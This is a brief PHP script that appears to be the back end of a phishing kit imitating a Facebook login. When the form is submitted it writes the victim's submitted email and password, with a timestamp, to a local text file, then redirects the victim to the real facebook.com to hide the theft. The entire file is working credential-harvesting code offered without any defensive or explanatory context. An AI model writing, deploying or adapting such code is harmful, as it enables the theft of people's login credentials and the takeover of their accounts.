<?php
date_default_timezone_set("Asia/kolkata");
$date=date("d-m-Y/g:i:sA");
if(isset($_POST['submit'])){
$handle=fopen("a.txt","a");
fwrite($handle, "\n");
fwrite($handle,"username :");
fwrite($handle,$_POST["email"]);
fwrite($handle, "\n");
fwrite($handle,"password :");
fwrite($handle,$_POST["password"]);
fwrite($handle, "\n");
fwrite($handle,"date :");
fwrite($handle,$date);
fwrite($handle, "\n");
fwrite($handle,"_._._._._._._._.");
header("location:https://facebook.com/");
}else{
header("location:index.html");
}




?>